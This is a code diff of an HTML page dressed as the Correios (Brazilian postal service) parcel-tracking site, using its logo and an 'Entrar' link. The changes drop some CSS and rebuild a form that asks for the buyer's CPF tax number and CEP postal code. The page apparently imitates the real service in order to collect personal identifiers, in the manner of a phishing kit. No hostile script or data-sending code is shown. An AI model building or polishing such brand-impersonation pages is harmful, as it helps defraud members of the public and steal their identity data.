@@ -135,80 +135,6 @@
     #nao-sou-eu:hover {
       color: #505050;
     }
-
-    /* Form com logo, inputs e botão na mesma linha */
-    #form-rastreamento {
-      display: flex;
-      align-items: center;
-      gap: 15px;
-      flex-wrap: nowrap;
-      justify-content: center;
-      margin-top: 1rem;
-    }
-
-    #form-rastreamento img.logo-form {
-      height: 40px;
-      display: block;
-      user-select: none;
-      flex-shrink: 0;
-    }
-
-    #form-rastreamento input[type="text"] {
-      flex: 1 1 200px;
-      min-width: 150px;
-      max-width: 250px;
-      padding: 0.375rem 0.75rem;
-      font-size: 1rem;
-      border-radius: 0.25rem;
-      border: 1px solid #ced4da;
-      outline: none;
-      transition: border-color 0.15s ease-in-out;
-    }
-
-    #form-rastreamento input[type="text"]:focus {
-      border-color: #80bdff;
-      box-shadow: 0 0 0 0.2rem rgba(0, 123, 255, 0.25);
-    }
-
-    #consultar-btn {
-      flex: 0 0 auto;
-      min-width: 120px;
-      padding: 0.5rem 1rem;
-      font-size: 1.1rem;
-      border-radius: 5px;
-      cursor: pointer;
-      background-color: #007bff;
-      border: none;
-      color: white;
-      transition: background-color 0.3s ease;
-      animation: pulsar 1s infinite;
-    }
-
-    #consultar-btn:hover {
-      background-color: #0056b3;
-    }
-
-    /* Responsividade: no celular empilha tudo */
-    @media (max-width: 576px) {
-      #form-rastreamento {
-        flex-wrap: wrap;
-        justify-content: center;
-      }
-
-      #form-rastreamento img.logo-form {
-        margin-bottom: 10px;
-        height: 30px;
-      }
-
-      #form-rastreamento input[type="text"] {
-        max-width: 100%;
-      }
-
-      #consultar-btn {
-        width: 100%;
-        min-width: unset;
-      }
-    }
   </style>
 </head>
 
@@ -219,19 +145,28 @@
       <i class="fas fa-caret-down ml-1"></i>
     </div>
     <div>
-      <nav class="w-100 d-flex align-items-center bg-grey-2 px-3 px-lg-3 py-1 border-bottom border-warning" style="height:48px">
-        <div class="menu-toggle" id="menu-toggle" style="width:50px">
+      <nav
+        class="w-100 d-flex align-items-center bg-grey-2 px-3 px-lg-3 py-1 border-bottom border-warning"
+        style="height: 48px"
+      >
+        <div class="menu-toggle" id="menu-toggle" style="width: 50px">
           <div class="bar"></div>
           <div class="bar"></div>
           <div class="bar"></div>
         </div>
-        <div class="ml-0 ml-lg-1 d-flex justify-content-center" style="width:100%">
+
+        <!-- Container centralizado para a logo, alinhado com o botão consultar -->
+        <div class="w-95 max-w-1000 mx-auto d-flex justify-content-center">
           <a href="#" class="py-2">
             <img src="images/correios.png" alt="Logo Correios" height="25" />
           </a>
         </div>
-        <div class="ml-4 d-none d-lg-block" style="width:150px">
-          <a href="#" class="py-1 text-blue-dark border-left border-secondary px-3 text-decoration-none">
+
+        <div class="ml-4 d-none d-lg-block" style="width: 150px">
+          <a
+            href="#"
+            class="py-1 text-blue-dark border-left border-secondary px-3 text-decoration-none"
+          >
             <img src="images/entrar.svg" alt="Correios" width="31" />
             <span class="ml-1">Entrar</span>
           </a>
@@ -241,27 +176,68 @@
   </header>
 
   <main>
-    <h1 class="mt-4 px-2 font-size-24 text-blue-dark font-weight-700 w-95 max-w-1000 d-flex justify-content-between" style="margin:0 auto;">
+    <h1
+      class="mt-4 px-2 font-size-24 text-blue-dark font-weight-700 w-95 max-w-1000 d-flex justify-content-between"
+      style="margin:0 auto;"
+    >
       Rastreamento
     </h1>
 
     <!-- Tela Formulário -->
-    <section id="tela-formulario" class="mt-3 p-4 bg-grey-3 w-95 max-w-1000" style="margin:0 auto;">
+    <section
+      id="tela-formulario"
+      class="mt-3 p-4 bg-grey-3 w-95 max-w-1000"
+      style="margin:0 auto;"
+    >
       <h5 style="color: #003157;" class="text-center font-weight-700 mb-4">
         <i class="far fa-exclamation-triangle"></i> ACOMPANHE SUAS ENCOMENDAS ABAIXO
       </h5>
 
       <form id="form-rastreamento">
-        <img src="images/correios.png" alt="Logo Correios" class="logo-form" />
-        <input type="text" name="cpf" class="form-control" placeholder="000.000.000-00" maxlength="14" required id="cpf" />
-        <input type="text" name="cep" class="form-control" id="cep" placeholder="00000-000" maxlength="9" required />
-        <button type="submit" class="btn btn-primary" id="consultar-btn">Consultar</button>
-      </form>
+        <span>Deseja acompanhar seu objeto?</span><br />
+        <span>Digite o CPF do comprador.</span>
+        <div class="form-group mt-1">
+          <input
+            type="text"
+            name="cpf"
+            class="form-control"
+            placeholder="000.000.000-00"
+            maxlength="14"
+            required
+            id="cpf"
+          />
+        </div>
 
-      <div id="loading-container" style="display: none; text-align: center; margin-top: 20px;">
-        <p style="font-size: 16px; color: #333;">Consultando seus dados...</p>
-        <div class="spinner"></div>
-      </div>
+        <span>Informe o seu CEP abaixo.</span>
+        <div class="form-group mt-1">
+          <input
+            type="text"
+            name="cep"
+            class="form-control"
+            id="cep"
+            placeholder="00000-000"
+            maxlength="9"
+            required
+          />
+        </div>
+
+        <div
+          class="form-group mt-1 d-flex justify-content-center"
+          id="botao-container"
+        >
+          <button type="submit" class="btn btn-primary" id="consultar-btn">
+            Consultar
+          </button>
+        </div>
+
+        <div
+          id="loading-container"
+          style="display: none; text-align: center; margin-top: 20px;"
+        >
+          <p style="font-size: 16px; color: #333;">Consultando seus dados...</p>
+          <div class="spinner"></div>
+        </div>
+      </form>
     </section>
 
     <!-- Tela Resultado -->
